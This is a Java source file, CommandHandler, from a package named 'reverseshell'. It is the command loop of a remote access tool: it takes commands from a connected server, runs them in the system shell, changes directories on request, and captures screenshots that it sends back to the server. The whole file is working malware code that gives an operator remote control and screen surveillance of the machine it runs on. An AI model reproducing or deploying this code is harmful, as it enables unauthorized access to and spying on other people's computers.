package obs1d1anc1ph3r.reverseshell;

import java.io.*;
import java.util.concurrent.TimeUnit;

public class CommandHandler {

    private final ServerConnection serverConnection;
    private final ScreenShot screenShot;
    private String currentDir = System.getProperty("user.dir");

    public CommandHandler(ServerConnection serverConnection) {
        this.serverConnection = serverConnection;
        this.screenShot = new ScreenShot();
    }

    public void handleCommands() throws IOException {
        String command;
        while ((command = serverConnection.readCommand()) != null) {
            if (command.equalsIgnoreCase("exit")) {
                System.out.println("[-] Server disconnected.");
                break;
            }

            StringBuilder fullResponse = new StringBuilder();

            if (command.startsWith("cd ")) {
                fullResponse.append(changeDirectory(command.substring(3).trim()));
            } else if (command.equalsIgnoreCase("screenshot")) {
                byte[] imageBytes = screenShot.imageBytes();
                if (imageBytes != null && imageBytes.length > 0) {
                    serverConnection.sendScreenShot(imageBytes);
                }
                continue;
            } else {
                fullResponse.append(executeCommand(command));
            }
            if (fullResponse.length() > 0) {
                serverConnection.sendResponse(fullResponse.toString().trim());
            }
        }
    }

    private String changeDirectory(String newDir) {
        File dir = new File(newDir);
        if (!dir.isAbsolute()) {
            dir = new File(currentDir, newDir);
        }
        try {
            dir = dir.getCanonicalFile();
            if (dir.isDirectory()) {
                currentDir = dir.getAbsolutePath();
                return "Changed directory to: " + currentDir;
            } else {
                return "Error: Not a valid directory.";
            }
        } catch (IOException e) {
            return "Error: Unable to change directory - " + e.getMessage();
        }
    }

    private String executeCommand(String command) {
        StringBuilder output = new StringBuilder();
        try {
            ProcessBuilder processBuilder = new ProcessBuilder(OSUtils.getShell(), OSUtils.getShellFlag(), command);
            processBuilder.directory(new File(currentDir));
            processBuilder.redirectErrorStream(true);
            Process process = processBuilder.start();

            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
            }

            boolean finished = process.waitFor(10, TimeUnit.SECONDS);
            if (!finished) {
                process.destroy();
                return "Error: Command timed out.";
            }

            int exitCode = process.exitValue();
            if (exitCode != 0) {
                return "Error executing command, exit code: " + exitCode;
            }

        } catch (IOException | InterruptedException e) {
            return "Error executing command: " + e.getMessage();
        }
        return output.toString().trim();
    }
}
